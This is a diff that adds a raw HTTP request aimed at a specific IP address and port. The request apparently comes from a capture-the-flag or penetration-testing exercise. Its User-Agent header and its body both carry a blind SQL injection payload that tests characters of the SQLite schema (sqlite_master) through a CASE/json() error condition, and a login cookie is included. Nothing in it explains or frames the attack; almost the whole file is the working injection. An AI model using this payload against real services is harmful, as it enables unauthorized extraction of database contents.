@@ -1,0 +1,13 @@
+GET / HTTP/1.1
+Host: 103.97.125.56:30662
+User-Agent: hiepck','','','',''), ((SELECT CASE WHEN substr((SELECT sql FROM sqlite_master), 1, 1) = 'c' THEN json('') ELSE 'Does not start with V' END as result),'','','','','')-- -
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+DNT: 1
+Connection: close
+Cookie: txp_login_public=fe801c5d02admin
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+hiepck','','','',''), ((SELECT CASE WHEN substr((SELECT sql FROM sqlite_master), 1, 1) = 'c' THEN json('') ELSE 'Does not start with V' END as result),'','','','','')-- -
